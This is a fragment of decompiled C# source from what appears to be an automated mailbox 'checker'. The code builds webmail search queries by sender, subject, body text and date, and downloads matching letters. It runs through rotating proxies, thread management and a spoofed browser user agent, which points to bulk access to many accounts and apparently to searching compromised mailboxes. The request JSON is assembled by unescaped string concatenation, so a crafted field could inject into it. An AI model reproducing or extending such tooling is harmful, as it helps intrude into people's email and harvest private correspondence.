			StringBuilder stringBuilder = new StringBuilder("{\"models\":[{\"name\":\"messages\",\"params\":{\"sort_type\":\"date\",");
			if (request.Sender != null)
			{
				stringBuilder.Append("\"hdr_from\":\"" + request.Sender + "\",");
			}
			if (request.Body != null)
			{
				stringBuilder.Append("\"request\":\"" + request.Body + "\",");
				stringBuilder.Append("\"scope\":\"body_text\",");
			}
			else if (request.Subject != null)
			{
				stringBuilder.Append("\"request\":\"" + request.Subject + "\",");
				stringBuilder.Append("\"scope\":\"hdr_subject\",");
			}
			stringBuilder.Append("\"search\":\"search\"}}],\"_ckey\":\"");
			stringBuilder.Append(this._ckey);
			stringBuilder.Append("\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\",\"_messages_per_page\":\"");
			stringBuilder.Append(SearchSettings.Instance.DownloadLetters ? SearchSettings.Instance.DownloadLettersLimit : 1);
			stringBuilder.Append("\"}");
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null)
					{
						stringBuilder.Append("\"from\":\"" + SearchSettings.Instance.DateFrom.Value.ToString("yyyyMMdd") + "\",");
					}
					if (SearchSettings.Instance.DateTo != null)
					{
						stringBuilder.Append("\"to\":\"" + SearchSettings.Instance.DateTo.Value.ToString("yyyyMMdd") + "\",");
					}
				}
			}
			else
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append("\"from\":\"" + request.DateFrom.Value.ToString("yyyyMMdd") + "\",");
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append("\"to\":\"" + request.DateTo.Value.ToString("yyyyMMdd") + "\",");
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060005CF RID: 1487 RVA: 0x00009D23 File Offset: 0x00007F23
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x060005D0 RID: 1488 RVA: 0x00026FB4 File Offset: 0x000251B4
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 YaBrowser/22.7.3.822 Yowser/2.5 Safari/537.36";
		}

		// Token: 0x060005D1 RID: 1489 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000304 RID: 772
		private Mailbox _mailbox;

		// Token: 0x04000305 RID: 773
		private ProxyClient _proxyClient;

		// Token: 0x04000306 RID: 774
		private CookieDictionary _cookies;

		// Token: 0x04000307 RID: 775
		private string _csrfToken;

		// Token: 0x04000308 RID: 776
		private string _trackId;

		// Token: 0x04000309 RID: 777
		private string _ckey;
	}
}
